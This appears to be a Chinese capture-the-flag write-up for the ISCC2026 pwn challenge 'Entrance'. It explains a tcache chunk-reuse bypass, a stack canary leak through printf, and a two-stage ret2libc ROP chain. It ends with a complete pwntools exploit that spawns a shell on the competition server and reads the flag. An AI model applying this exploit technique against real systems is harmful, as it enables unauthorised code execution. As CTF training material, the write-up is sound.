+++
title = "Entrance"
date = "2026-05-18"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

Pwn-Entrance

解题思路

1\. 程序分析与入口绕过

题目给出一个64位ELF文件entrance，启用Canary与NX保护，未开启PIE。运行程序后观察到主函数存在一条分支判断——全局变量secret必须等于0x378才会进入核心函数func3，否则直接退出。因此首要目标是将secret设置为目标值。

审计入口逻辑发现程序首先通过malloc(0x48)分配一块堆内存，向其中写入字符串"hack"后立即释放。接着程序要求用户输入一个长度值len，并以该长度再次malloc(len)，将用户输入的access key存入其中。随后用strncmp将这片新内存与"hack"进行比较，匹配成功则将secret设为0x378。

这里的关键漏洞在于tcache的分配策略：如果第二次malloc请求的大小与第一次释放的chunk大小一致（0x48即72字节），ptmalloc会直接从tcache bin中摘取刚刚释放的那块chunk返回给用户。此时用户输入的access key会覆盖该chunk的前几个字节，而strncmp比较的是同一块内存地址，自然会匹配成功。

因此发送token length=72，access key="hack"即可通过前置检查，程序进入func3。

2\. Canary信息泄露

func3函数中存在两次read(0, buf, 0x49)调用，中间夹着一个printf("%s", buf)。栈帧中buf距离canary为24字节，而read允许读入0x49(73)字节，远超该距离。第一次read刚好能覆盖到canary区域。

Canary的设计特性是低字节固定为\\x00，用于防止字符串函数直接泄露。但printf("%s")遇到\\x00会停止输出，所以如果恰好填满24字节的buf区域，canary的低位\\x00仍然会截断输出。要泄露canary的其余7个字节，需要多发送一个字节将\\x00覆盖掉——因此实际发送25个'A'字符。

25个'A'填满24字节buf后再覆盖canary的第一个\\x00字节，printf将持续输出直到遇到下一个\\x00，从而将canary的高7字节带出。接收回显后截取泄露部分，再在低字节补回\\x00即恢复完整canary值。

3\. 构建ROP链泄露libc基址

拿到canary后，保护机制已被绕过。第二次read同样写入buf位置，长度0x49足以容纳一段精简的ROP链。程序无PIE，所有代码段地址固定。

第一轮ROP的设计目标：调用puts输出自身GOT表项中存储的puts真实地址，然后跳回main函数重新触发漏洞。所需gadget均可从二进制中直接提取：

- pop rdi; ret 位于 0x4018F3

- puts@plt 位于 0x401050

- puts@got 位于 0x404028

- main 位于 0x4017A7

payload结构为：24字节padding + canary + 8字节覆盖rbp + ROP链。

puts@got中存放的值被打印出来后，减去libc中puts的固定偏移即得到libc基地址。本地提供的libc为2.31版本，但远程服务器泄露的偏移与本地不匹配。通过比对泄露值与各版本libc符号表，确认远程实际使用libc6\_2.23-0ubuntu11.3\_amd64，关键偏移如下：

- puts: 0x6F6A0

- system: 0x453A0

- /bin/sh: 0x18CE57

4\. 第二轮ROP获取Shell

程序返回main后重新执行到func3，此时secret仍保持0x378无需再次绕过。第一轮printf只需发送短字符串快速通过，第二轮read则布置最终攻击链。

最终ROP链为标准ret2libc套路：

payload = padding(24) + canary + padding(8) + ret(gadget) + pop\_rdi + binsh\_addr + system\_addr

其中额外插入一个ret指令是为了满足Ubuntu 64位系统对栈16字节对齐的要求，避免system内部movaps指令触发段错误。执行后system("/bin/sh")启动shell，即可读取flag。

Exp

\`\`\`python

\#!/usr/bin/env python3

from pwn import \*

import re

context(os="linux", arch="amd64", log\_level="debug")

binary = ELF("./entrance", checksec=False)

local\_libc = ELF("./libc6\_2.31-0ubuntu9.17\_amd64.so", checksec=False)

context.binary = binary

TARGET\_HOST = "39.96.193.120"

TARGET\_PORT = 10007

RUN\_MODE = "remote"

\# offsets confirmed for remote: libc6\_2.23-0ubuntu11.3\_amd64

OFF\_PUTS = 0x6F6A0

OFF\_SYSTEM = 0x453A0

OFF\_BINSH = 0x18CE57

POP\_RDI = 0x4018F3

RET\_ADDR = 0x40101A

PAD\_SIZE = 24

def connect():

if RUN\_MODE == "remote":

return remote(TARGET\_HOST, TARGET\_PORT)

elif RUN\_MODE == "local":

return process("./entrance")

else:

raise SystemExit(f"unknown mode: {RUN\_MODE}")

def bypass\_secret(r):

r.sendlineafter(b"Enter token length:", b"72")

r.sendlineafter(b"access key:", b"hack")

def dump\_canary(r):

r.recvuntil(b"hello\\n")

r.send(b"A" \* (PAD\_SIZE + 1))

resp = r.recvuntil(b".congratulate to you")

marker = resp.index(b"A" \* (PAD\_SIZE + 1))

leak\_bytes = resp\[marker + PAD\_SIZE + 1 : marker + PAD\_SIZE + 8\]

canary\_val = b"\\x00" + leak\_bytes

log.success("canary =&gt; %s", canary\_val.hex())

return canary\_val

def dump\_libc(r, canary\_val):

stage1 = flat(

b"B" \* PAD\_SIZE,

canary\_val,

b"C" \* 8,

p64(POP\_RDI),

p64(binary.got\["puts"\]),

p64(binary.plt\["puts"\]),

p64(binary.sym\["main"\]),

)

r.send(stage1)

r.recvuntil(b"\[System\] Welcome to the system!")

marker = b"It is good to see you \\n"

data = r.recvuntil(b"\\n\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\\n")

leak\_raw = data\[data.index(marker) + len(marker) : data.index(b"\\n\*\*\*\*\*\*\*\*\*")\]

puts\_real = u64(leak\_raw.ljust(8, b"\\x00"))

log.success("puts@libc =&gt; %\#x", puts\_real)

return puts\_real

def reenter\_func3(r):

r.recvuntil(b"hello\\n")

r.send(b"Z\\x00")

r.recvuntil(b".congratulate to you")

if RUN\_MODE == "local":

OFF\_PUTS = local\_libc.sym\["puts"\]

OFF\_SYSTEM = local\_libc.sym\["system"\]

OFF\_BINSH = next(local\_libc.search(b"/bin/sh\\x00"))

r = connect()

bypass\_secret(r)

canary\_val = dump\_canary(r)

puts\_real = dump\_libc(r, canary\_val)

base\_libc = puts\_real - OFF\_PUTS

log.success("libc base =&gt; %\#x", base\_libc)

reenter\_func3(r)

stage2 = flat(

b"D" \* PAD\_SIZE,

canary\_val,

b"E" \* 8,

p64(RET\_ADDR),

p64(POP\_RDI),

p64(base\_libc + OFF\_BINSH),

p64(base\_libc + OFF\_SYSTEM),

)

r.send(stage2)

r.recvuntil(b"It is good to see you \\n")

r.sendline(b"cat /flag\* 2&gt;/dev/null; cat flag\* /flag\* 2&gt;/dev/null; exit")

output = r.recvall(timeout=5)

flag\_match = re.search(rb"(ISCC|flag)\\{\[\^}\]+\\}", output)

if flag\_match:

print("\[+\] FLAG:", flag\_match.group().decode())

else:

print(output.decode("latin-1", errors="replace"))

r.close()

\`\`\`
